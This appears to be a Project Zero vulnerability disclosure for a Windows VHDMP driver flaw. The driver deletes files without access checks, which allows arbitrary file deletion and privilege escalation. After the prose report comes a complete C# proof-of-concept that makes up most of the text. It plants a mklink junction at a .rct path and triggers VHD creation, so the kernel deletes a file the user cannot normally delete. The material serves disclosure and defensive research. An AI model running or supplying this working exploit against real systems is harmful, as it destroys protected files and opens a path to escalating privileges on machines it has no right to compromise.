/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=915

Windows: VHDMP ZwDeleteFile Arbitrary File Deletion EoP
Platform: Windows 10 10586 and 14393. No idea about 7 or 8.1 versions.
Class: Elevation of Privilege

Summary:
The VHDMP driver doesn’t safely delete files leading to arbitrary file deletion which could result in EoP.

Description:

The VHDMP driver is used to mount VHD and ISO files so that they can be accessed as a normal mounted volume. There are numerous places where the driver calls ZwDeleteFile without specifying OBJ_FORCE_ACCESS_CHECK. This can be abused to delete any arbitrary file or directory on the filesystem by abusing symbolic links to redirect the delete file name to an arbitrary location. Also due to the behaviour of ZwDeleteFile we also don’t need to play games with the DosDevices directory or anything like that, the system call opens the target file without specifying FILE_DIRECTORY_FILE or FILE_NON_DIRECTORY_FILE flags, this means it’s possible to use a mount point even to redirect to a file due to the way reparsing works in the kernel.

Some places where ZwDeleteFile is called (based on 10586 x64 vhdmp.sys) are:

VhdmpiDeleteRctFiles
VhdmpiCleanupFileWrapper
VhdmpiInitializeVhdSetExtract
VhdmpiCtCreateEnableTrackingRequest
VhdmpiMultiStageSwitchLogFile
VhdmpiApplySnapshot
And much much more.

You get the idea, as far as I can tell none of these calls actually pass OBJ_FORCE_ACCESS_CHECK flag so all would be vulnerable (assuming you can specify the filename suitably). Note this doesn’t need admin rights as we never mount the VHD. However you can’t use it in a sandbox as opening the drive goes through multiple access checks.

While deleting files/directories might not seem to be too important you can use it to delete files in ProgramData or Windows\Temp which normally are OWNER RIGHTS locked to the creator. This could then be recreated by the user due to default DACLs and abuse functionality of other services/applications. 

Proof of Concept:

I’ve provided a PoC as a C# source code file. You need to compile with .NET 4 or higher. It will delete an arbitrary file specified on the command line. It abuses the fact that during VHD creation the kernel will delete the .rct/.mrt files (this limits the poc to Win10 only). So we drop a test.vhd.rct mount point pointing at the target into the same directory and call create.

1) Compile the C# source code file.
2) Execute the poc on Win 10 passing the path to the file to delete. It will check that the file is present and can’t be deleted.
3) It should print that it successfully deleted the file

Expected Result:
The target file isn’t deleted, the VHD creation fails.

Observed Result:
The target file is deleted.
*/

using Microsoft.Win32.SafeHandles;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace DfscTest
{
    class Program
    {
        enum StorageDeviceType
        {
            Unknown = 0,
            Iso = 1,
            Vhd = 2,
            Vhdx = 3,
            VhdSet = 4,
        }

        [StructLayout(LayoutKind.Sequential)]
        struct VirtualStorageType
        {
            public StorageDeviceType DeviceId;
            public Guid VendorId;
        }

        enum OpenVirtualDiskFlag
        {
            None = 0,
            NoParents = 1,
            BlankFile = 2,
            BootDrive = 4,
            CachedIo = 8,
            DiffChain = 0x10,
            ParentcachedIo = 0x20,
            VhdSetFileOnly = 0x40,
        }

        enum CreateVirtualDiskVersion
        {
            Unspecified = 0,
            Version1 = 1,
            Version2 = 2,
            Version3 = 3,
        }
            
        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct CreateVirtualDiskParameters
        {
            public CreateVirtualDiskVersion Version;
            public Guid UniqueId;
            public ulong MaximumSize;
            public uint BlockSizeInBytes;
            public uint SectorSizeInBytes;
            public uint PhysicalSectorSizeInBytes;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string ParentPath;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string SourcePath;
            // Version 2 on
            public OpenVirtualDiskFlag OpenFlags;
            public VirtualStorageType ParentVirtualStorageType;
            public VirtualStorageType SourceVirtualStorageType;
            public Guid ResiliencyGuid;
            // Version 3 on
            [MarshalAs(UnmanagedType.LPWStr)]
            public string SourceLimitPath;
            public VirtualStorageType BackingStorageType;
        }

        enum VirtualDiskAccessMask
        {
            None = 0,
            AttachRo = 0x00010000,
            AttachRw = 0x00020000,
            Detach = 0x00040000,
            GetInfo = 0x00080000,
            Create = 0x00100000,
            MetaOps = 0x00200000,
            Read = 0x000d0000,
            All = 0x003f0000
        }

        enum CreateVirtualDiskFlag
        {
            None = 0x0,
            FullPhysicalAllocation = 0x1,
            PreventWritesToSourceDisk = 0x2,
            DoNotcopyMetadataFromParent = 0x4,
            CreateBackingStorage = 0x8,
            UseChangeTrackingSourceLimit = 0x10,
            PreserveParentChangeTrackingState = 0x20,
        }        

        [DllImport("virtdisk.dll", CharSet=CharSet.Unicode)]
        static extern int CreateVirtualDisk(
            [In] ref VirtualStorageType VirtualStorageType,
            string Path,
            VirtualDiskAccessMask        VirtualDiskAccessMask,
            [In] byte[] SecurityDescriptor,
            CreateVirtualDiskFlag        Flags,
            uint ProviderSpecificFlags,
            [In] ref CreateVirtualDiskParameters Parameters,
            IntPtr  Overlapped,
            out IntPtr Handle
        );

        static Guid GUID_DEVINTERFACE_SURFACE_VIRTUAL_DRIVE = new Guid("2E34D650-5819-42CA-84AE-D30803BAE505");
        static Guid VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT = new Guid("EC984AEC-A0F9-47E9-901F-71415A66345B");

        static SafeFileHandle CreateVHD(string path)
        {
            VirtualStorageType vhd_type = new VirtualStorageType();
            vhd_type.DeviceId = StorageDeviceType.Vhd;
            vhd_type.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT;

            CreateVirtualDiskParameters ps = new CreateVirtualDiskParameters();
            ps.Version = CreateVirtualDiskVersion.Version1;
            ps.SectorSizeInBytes = 512;
            ps.MaximumSize = 100 * 1024 * 1024;
            IntPtr hDisk;
            int error = CreateVirtualDisk(ref vhd_type, path, VirtualDiskAccessMask.All, null, CreateVirtualDiskFlag.None, 0, ref ps, IntPtr.Zero, out hDisk);
            if (error != 0)
            {
                throw new Win32Exception(error);
            }

            return new SafeFileHandle(hDisk, true);
        }
        
        static void Main(string[] args)
        {
            try
            {
                if (args.Length < 1)
                {
                    Console.WriteLine(@"[USAGE]: poc file\to\delete");
                    Environment.Exit(1);
                }

                string delete_path = Path.GetFullPath(args[0]);

                if (!File.Exists(delete_path))
                {
                    Console.WriteLine("[ERROR]: Specify a valid file to delete");
                    Environment.Exit(1);
                }

                try
                {
                    File.Delete(delete_path);
                    Console.WriteLine("[ERROR]: Could already delete file, choose one which you normally can't delete");
                    Environment.Exit(1);
                }
                catch
                {                    
                }

                string vhd_path = Path.GetFullPath("test.vhd");
                File.Delete(vhd_path);
                try
                {
                    Directory.Delete(vhd_path + ".rct");
                }
                catch
                {
                }

                Console.WriteLine("[INFO]: Creating VHD {0}", vhd_path);
                string cmdline = String.Format("/C mklink /J \"{0}.rct\" \"{1}\"", vhd_path, args[0]);
                ProcessStartInfo start_info = new ProcessStartInfo("cmd", cmdline);
                start_info.UseShellExecute = false;

                Process p = Process.Start(start_info);
                p.WaitForExit();
                if (p.ExitCode != 0)
                {
                    Console.WriteLine("[ERROR]: Can't create symlink");
                    Environment.Exit(1);
                }
                
                using (SafeFileHandle handle = CreateVHD(vhd_path))
                {
                }

                if (File.Exists(delete_path))
                {
                    Console.WriteLine("[ERROR]: Didn't delete arbitrary file");
                }
                else
                {
                    Console.WriteLine("[SUCCESS]: Deleted arbitary file");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR]: {0}", ex.Message);
            }
        }
    }
}
